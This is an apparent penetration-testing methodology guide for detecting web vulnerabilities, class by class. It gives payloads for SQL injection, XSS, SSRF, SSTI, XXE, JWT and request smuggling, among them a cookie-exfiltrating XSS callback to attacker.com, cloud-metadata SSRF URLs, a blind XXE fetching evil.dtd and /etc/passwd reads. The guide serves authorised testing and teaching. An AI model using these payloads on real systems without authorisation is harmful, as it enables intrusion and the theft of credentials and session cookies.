# Web Vulnerability Analysis — Per-Class Detection

Systematic detection methodology per vulnerability class. For each class: identify the surface, send detection probe, confirm finding, assess impact. Do not exploit here — pass to `web-exploit-technique`.

---

## SQL Injection (SQLi)

### Surface identification

Any input that reaches a database query: URL parameters, POST fields, cookie values, HTTP headers (`User-Agent`, `X-Forwarded-For`, `Referer`), search filters, sort/order parameters, JSON/XML fields.

### Detection probes

```
# Basic syntax error triggers
'    "    ;    --    /*    */    )    (

# Boolean detection
' OR '1'='1
' OR 1=1--
' AND 1=2--          # should return empty/different response

# Time-based (blind)
' OR SLEEP(5)--           # MySQL
' OR pg_sleep(5)--        # PostgreSQL  
'; WAITFOR DELAY '0:0:5'--  # MSSQL

# Error-based (look for SQL error messages in response)
'%22    \'    %27
```

### Confirmation

- Boolean: response differs meaningfully between true (`1=1`) and false (`1=2`) conditions
- Error-based: SQL syntax error message reveals DB type
- Time-based: response delayed by exactly injected seconds

**Tool for confirmation:** `sqlmap --level=2 --risk=1 --batch` (detection mode only)

### Impact assessment

| SQLi type | Impact |
|-----------|--------|
| UNION-based | Data extraction, DB enumeration |
| Error-based | Data extraction, version/schema disclosure |
| Blind boolean/time | Data extraction (slow) |
| Stacked queries | DDL execution, OS interaction (DB-dependent) |
| `--os-shell` in sqlmap | RCE via INTO OUTFILE or xp_cmdshell |

---

## Cross-Site Scripting (XSS)

### Surface identification

Any location where user input is reflected in HTML output: search bars, comments, profile fields, URL parameters reflected in page, error messages, HTTP headers reflected in responses.

DOM XSS: inputs that reach dangerous sinks (`innerHTML`, `document.write`, `eval`, `setTimeout` with string, jQuery `$(location.hash)`).

### Detection probes

```html
# Generic test string — observe if reflected unencoded
<script>alert(1)</script>

# Attribute injection test
" onmouseover="alert(1)
' onmouseover='alert(1)

# Polyglot (tests many contexts at once)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

# HTML entity context
&lt;script&gt;alert(1)&lt;/script&gt;

# DOM XSS — add to fragment
#<img src=x onerror=alert(1)>
```

### Confirmation

- Observe if payload executes (alert box, console output)
- For blind XSS: use callback URL — `<script>fetch('https://attacker.com/'+document.cookie)</script>`
- Check response source for unencoded reflection

**Tool for detection:** `dalfox url "https://target.com/search?q=test"` (see `offensive-tools/vuln-scanners/dalfox/`)

### Impact assessment

| XSS type | Impact |
|----------|--------|
| Reflected | Requires user click on crafted URL |
| Stored | Executes for every user viewing the content — highest impact |
| DOM-based | Client-side only — evades server-side WAF |
| Blind | Executes in admin panel or other user context |

---

## Server-Side Request Forgery (SSRF)

### Surface identification

Any parameter that causes the server to make an outbound request: `url=`, `path=`, `dest=`, `redirect=`, `uri=`, `load=`, webhook URLs, image import features, PDF generators that fetch URLs, PDF/document preview, file import from URL, `X-Forwarded-For` / `Host` header in some configurations.

### Detection probes

```
# Direct — point to attacker-controlled server
url=http://attacker.com/ssrf-test
url=https://attacker.com/ssrf-test

# Internal — cloud metadata endpoint
url=http://169.254.169.254/latest/meta-data/          # AWS IMDS v1
url=http://metadata.google.internal/computeMetadata/v1/  # GCP (requires header)
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure

# Internal port scan
url=http://127.0.0.1:22        # time/response difference if port open
url=http://127.0.0.1:80
url=http://10.0.0.1:8080

# DNS-based blind detection (use out-of-band: Burp Collaborator, interactsh)
url=http://UNIQUE_ID.oast.pro
```

### Confirmation

- Receive callback on attacker server → confirmed blind SSRF
- AWS metadata: response contains `ami-id`, `instance-id` → confirmed
- Port scan: response time difference (closed port = fast, open port = connection attempt = slow)

**Tool:** `ssrfmap` (see `offensive-tools/vuln-scanners/ssrfmap/`)

### Filter bypass techniques

```
# IP encoding
http://2130706433/          # 127.0.0.1 as decimal
http://0x7f000001/          # 127.0.0.1 as hex
http://0177.0.0.01/         # 127.0.0.1 as octal

# DNS rebinding / redirect chains
# Use collaborator that resolves to internal IP after first lookup

# Schema confusion
dict://internal:11211/stat   # Memcached via SSRF
gopher://internal:6379/_INFO  # Redis via SSRF
file:///etc/passwd            # local file read

# URL parser confusion
http://attacker.com@127.0.0.1/
http://127.0.0.1#.attacker.com
http://[::ffff:127.0.0.1]/
```

---

## Server-Side Template Injection (SSTI)

### Surface identification

Any input rendered inside a template engine: user profile fields displayed in email templates, search result pages using template rendering, custom reports/invoice generation, error messages including user input.

### Detection probe

Inject a math expression — different engines evaluate it differently:

```
{{7*7}}            # Should render as 49 — confirms template evaluation
${7*7}             # Java EL, Freemarker
<%= 7*7 %>         # ERB (Ruby)
#{7*7}             # Ruby
*{7*7}             # Thymeleaf (Spring)
{{7*'7'}}          # Jinja2 → 7777777 (string multiplication)
                   # Twig → 49 (numeric)
```

### Engine identification

```
{{7*7}}   → 49    → Jinja2/Twig (Python/PHP)
{{7*7}}   → blank → Jinja2 with sandbox
${7*7}    → 49    → Freemarker, Velocity (Java)
<%= 7*7 %> → 49  → ERB (Ruby)
```

**Tool:** `sstimap -u "https://target.com/profile?name=test"` (see `offensive-tools/vuln-scanners/sstimap/`)

### Impact: RCE via template engine

Once confirmed, SSTI often leads directly to RCE. Pass to `web-exploit-technique` for exploitation.

---

## XML External Entity (XXE)

### Surface identification

Any endpoint that accepts XML input: SOAP APIs, XML import features, file upload accepting XML/DOCX/SVG/XSD, RSS/Atom feed processing, content-type XML parsers.

### Detection probe

```xml
# Insert into XML body:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe "test">
]>
<root><data>&xxe;</data></root>

# If "test" appears in response → entity expansion works → test for file read:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

# Blind XXE — out-of-band (when no reflection in response):
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root/>
```

### Content-type switching

If the application accepts JSON but also processes XML when content-type is changed:
```
Content-Type: application/xml
```

---

## Insecure Direct Object Reference (IDOR)

### Surface identification

Any endpoint that references an object by ID: `/api/users/123`, `/orders/456`, `/documents/789.pdf`, `/profile?user_id=123`, `/invoice/download?id=999`.

### Detection methodology

1. Identify an object reference (numeric ID, UUID, hash, username, filename).
2. Authenticate as user A — note the object IDs you own.
3. Authenticate as user B (second account) — note user B's object IDs.
4. While authenticated as user A, replace your ID with user B's ID.
5. If user A can read/write/delete user B's data → IDOR confirmed.

```
# Test vectors:
- Numeric increment: /api/orders/1001 → /api/orders/1002
- UUID enumeration: /api/docs/UUID_A → /api/docs/UUID_B
- Parameter pollution: /api/profile?id=self → /api/profile?id=other_user
- JSON body field: {"user_id": 123} → {"user_id": 456}
- HTTP method swap: GET → PUT/DELETE on same resource
```

### Impact

- Horizontal: access other users' data → data breach
- Vertical: admin resource access → privilege escalation
- Write IDOR: modify other users' data, delete records

---

## Authentication and JWT attacks

### Auth flow analysis checklist

```
- [ ] Login with wrong password: consistent timing? (timing oracle)
- [ ] Password reset: token entropy, expiry, reuse after use
- [ ] Account enumeration: does "user not found" differ from "wrong password"?
- [ ] Brute-force protection: lockout, CAPTCHA, rate limiting
- [ ] MFA: OTP replay accepted? Backup codes brute-forceable?
- [ ] Auth bypass: response manipulation (change status 403→200, remove error field)
- [ ] Default credentials: admin/admin, admin/password, root/root
```

### JWT detection attacks

```bash
# Decode JWT (without verification)
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | jq

# alg:none attack — remove signature
# Change header {"alg":"HS256"} → {"alg":"none"}
# Reconstruct token with empty signature: header.payload.

# RS256 → HS256 confusion
# If server has RS256 public key, try signing with HS256 using the public key as secret

# Weak secret brute-force
hashcat -a 0 -m 16500 token.jwt wordlist.txt

# kid injection
# If kid parameter present in header: try kid=../../dev/null or kid='; DROP TABLE...
```

**Tool:** `jwt_tool -t https://target.com/endpoint -rh "Authorization: Bearer <token>"` (see `offensive-tools/web/jwt-tool/`)

---

## File upload vulnerabilities

### Detection methodology

1. Upload a valid file — observe response, storage path, access URL.
2. Try to access the uploaded file — is it served from webroot? What URL?
3. Test extension restrictions:
   - Upload `.php` → rejected? Try `.php5`, `.phtml`, `.pHp`, `.php.jpg`
   - Try MIME type mismatch: `.php` file with `Content-Type: image/jpeg`
   - Try null byte: `shell.php%00.jpg`
4. Test content validation:
   - Magic bytes bypass: prepend valid JPEG header to PHP payload
   - SVG upload → stored XSS via `<script>` in SVG
5. Check if uploaded file is executed vs. served:
   - Access the file URL — does PHP execute? Or download?

### Confirmation

- Upload `.php` payload, access via URL, receive RCE output → critical
- Upload `.svg` with XSS, access URL, script executes → stored XSS

See `web-exploit-technique` for exploitation payloads.

---

## Deserialization

### Surface identification

Look for serialized data in: cookie values (base64-encoded Java/PHP objects), `__viewstate` parameter (ASP.NET), API request bodies with binary-encoded objects, `X-Java-Deserialized-Object` headers.

### Detection

```bash
# Java serialized object magic bytes: aced0005
echo -n "<cookie_value>" | base64 -d | xxd | head -1
# If starts with: ac ed 00 05 → Java serialized object

# PHP serialization pattern
O:8:"stdClass":1:{s:4:"name";s:4:"test";}

# .NET ViewState — check if MAC validation disabled
# Decode ViewState, check first 20 bytes for HMAC
```

### Tools

- `ysoserial.net` — .NET gadget chain payloads
- `ysoserial` (Java) — Java gadget chain generation  
- `phpggc` — PHP gadget chain generator

Pass to `web-exploit-technique` with serialized object details for exploit generation.

---

## CORS misconfiguration

### Detection

```bash
# Add Origin header — check if reflected in response
curl -H "Origin: https://attacker.com" -I https://target.com/api/data

# Check response for:
# Access-Control-Allow-Origin: https://attacker.com   (ACAO reflects Origin → vulnerable)
# Access-Control-Allow-Credentials: true              (credentials included → critical)

# Null origin test
curl -H "Origin: null" -I https://target.com/api/data
```

Tool: `corsy -u https://target.com` (see `offensive-tools/web/corsy/`)

### Impact: sensitive data extraction via cross-origin requests if ACAO reflects with credentials.

---

## HTTP Request Smuggling

### Detection

Send ambiguous CL/TE headers — observe response anomalies:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: X
```

Tool: `smuggler -u https://target.com` (see `offensive-tools/web/smuggler/`)  
Alternative: Burp Suite HTTP Request Smuggler extension.

Confirm via: 404 responses becoming 200, timeouts indicating poison, or other users' requests appearing in your response.

---

## GraphQL Attack Surface Detection

### Surface identification

Look for GraphQL endpoints and query entry points:

- `/graphql`, `/api/graphql`, `/graphiql`, `/playground`
- Mobile/backend JSON routes that accept `{"query": ...}`

### Detection probes

```bash
# Introspection probe (if enabled)
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Alias/batching abuse indicator
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{a:user(id:1){id} b:user(id:2){id} c:user(id:3){id}}"}'
```

### Confirmation

- Introspection reveals type map and hidden operations
- Authorization inconsistencies across IDs in the same query
- Resolver-level IDOR / overfetch independent of route-level auth

### Impact cues

- Sensitive fields exposed through schema exploration
- Horizontal or vertical privilege bypass via resolver logic
- Resource exhaustion through deeply nested or batched queries

---

## Host Header and URL Parser Confusion Detection

### Surface identification

Any feature using absolute URLs, callback building, allowlists, or server-side fetchers:

- Password reset emails
- OAuth callback handling
- Tenant routing and canonical URL enforcement
- SSRF protections based on hostname parsing

### Detection probes

```bash
# Host header poisoning
curl -i https://target.com/ -H "Host: attacker.com"
curl -i https://target.com/ -H "X-Forwarded-Host: attacker.com"

# URL authority confusion probes
http://attacker.com@127.0.0.1/
http://127.0.0.1#attacker.com/
http://[::ffff:127.0.0.1]/

# IPv6 zone identifier confusion in validation paths
http://[::1%25.example.com]/
```

### Confirmation

- Policy decision value differs from connection target value
- Reflected/generated absolute links use attacker-controlled host
- Allowlist check passes while request resolves to internal target

### Impact cues

- Password reset poisoning
- OAuth callback/state confusion chains
- SSRF guardrail bypass via parser differentials

---

## Recursive Merge Pollution (Prototype/Class-style) Detection

### Surface identification

Look for recursive merge helpers accepting attacker-controlled nested objects:

- JavaScript: deep merge into config objects
- Python/Ruby: recursive attribute assignment from JSON
- Dynamic object hydration without key allowlists

### Detection probes

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"class": {"superclass": {"url": "http://attacker"}}}
```

### Confirmation

- Security-sensitive properties change outside intended object scope
- Authorization or downstream behavior changes after merge-only input
- Polluted values persist across requests/process lifetime

### Impact cues

- Privilege escalation via polluted authorization checks
- Unsafe sink redirection (HTTP target, signing key, execution list)
- Broad application-state compromise when class/global scope is affected
